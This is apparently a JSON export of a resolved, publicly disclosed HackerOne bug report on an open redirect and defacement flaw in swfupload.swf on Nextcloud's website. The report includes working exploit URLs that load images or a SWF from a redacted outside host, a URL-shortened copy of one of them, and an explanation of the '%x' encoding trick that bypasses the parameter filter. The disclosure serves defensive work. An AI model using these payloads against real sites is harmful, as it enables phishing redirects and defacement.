{
  "id": 209520,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDk1MjA=",
  "url": "https://hackerone.com/reports/209520",
  "title": "http://www.nextcloud.com/wp-includes/js/swfupload/swfupload.swf allows open redirect / site defacement",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2017-02-28T07:12:50.139Z",
  "submitted_at": "2017-02-28T07:12:50.139Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "todayisnew",
    "url": "/todayisnew",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/vyC75Ahqgs71NFmwarUBLqSD/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 13291,
    "url": "https://hackerone.com/nextcloud",
    "handle": "nextcloud",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Nextcloud",
      "twitter_handle": "nextclouders",
      "website": "https://nextcloud.com",
      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-03-07T21:55:51.808Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-02-06T21:55:48.683Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "\nGood day, I truly hope it treats you well on your side of the screen :)\n\nI have found that your website uses the flash file: swfupload.swf to allow your users to upload files.\n\nThe tl;dr version of this bug report is it allows an open redirect to any site a non kind person may want to exploit or website defacement with the option to put any image on your site to share with others.  If not greatly in scope I understand, just wanted to help you be more secure :)\n\nThe link in question is:\n\nhttp://www.nextcloud.com/wp-includes/js/swfupload/swfupload.swf?debugEn%xabled=true&buttonImag%xeURL=https://████████/PugOfConcept/pugOfConcept.swf\n\nFriendly url shorted version:\n\nhttps://tinyurl.com/zduxnhz\n\nI've already created a fancy animated gif of the exploit in action so you can click, watch, and hopefully see a cute POC surprise on video end.\n\nhttps://www.dropbox.com/s/0343g6qgjdz1y1r/nextcloud.com_swf_upload_open_redirect_2_27_2017.gif?dl=0\n\nDefacement Link\n\nhttp://www.nextcloud.com/wp-includes/js/swfupload/swfupload.swf?debug%%Enabled=true&buttonTe%%xt=&buttonImag%%eURL=http://██████████/PugOfConcept/nopuppies.jpg\n\n\nFull report details:\n\na) Why Open Redirects can be harmful for your users and your company:\n   https://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards\n\nb) The source of the most recent version of swfupload.swf is here:\n   https://github.com/WordPress/secure-swfupload\n\nThe bad news is the newest version is vulnerable to the exploit (I will be reporting it to wordpress to fix hopefully)\n\nThey strongly suggest updating to a newer move secure version:\nhttp://www.plupload.com/\n\n\nc) How the exploit works:\n\nWhen you visit a swf, query string parameters (what appears after the ?) can be passed along in the request:\n\nhttp://myawesomewebsite.com/wp-includes/js/swfupload/swfupload.swf?   <debugEn%xabled=true?&buttonImag%xeURL=https://█████/PugOfConcept/pugOfConcept.swf>\n\t\nFlash reads in these variables via a special variable: root.loaderInfo.parameters\n\nThe intended solution is that they tried to filter out if query string parameters were passed along in the request by checking for them and if the were passed to delete them.\n   \n\tfor(key in params)\n\t{\n\t\t\tif(query.hasOwnProperty(Utils.trim(key)))\n\t\t{\n\t\t\tdelete params[key];\n\t\t}\n\t}\n\n\nThe trick is that Flash will filter and non valid url encoded variables from a string, so %00-%FF are valid ascii encoded strings, a = %61 b = %62 etc\nI tricked the system with the variable passed \"?debugEnabled=true\" normally would be filtered, but with debugEn%xabled=true, the %x is a non valid hex string :)  Since Hex counts from 0-F There is no valid %x.\n\nMay you be well on your side of the screen :)\n\n-Eric\n\nAlso vulnerable:\n\n",
  "weakness": {
    "id": 53,
    "name": "Open Redirect"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-03-07T21:55:48.765Z",
  "allow_singular_disclosure_after": -124209625.36212614,
  "singular_disclosure_allowed": true,
  "vote_count": 39,
  "voters": [
    "lukasreschke",
    "huwwp",
    "a_d_a_m",
    "drsniper",
    "shubs",
    "rook1337",
    "tess",
    "softwareguy",
    "term1nal",
    "xlife",
    "and 29 more..."
  ],
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
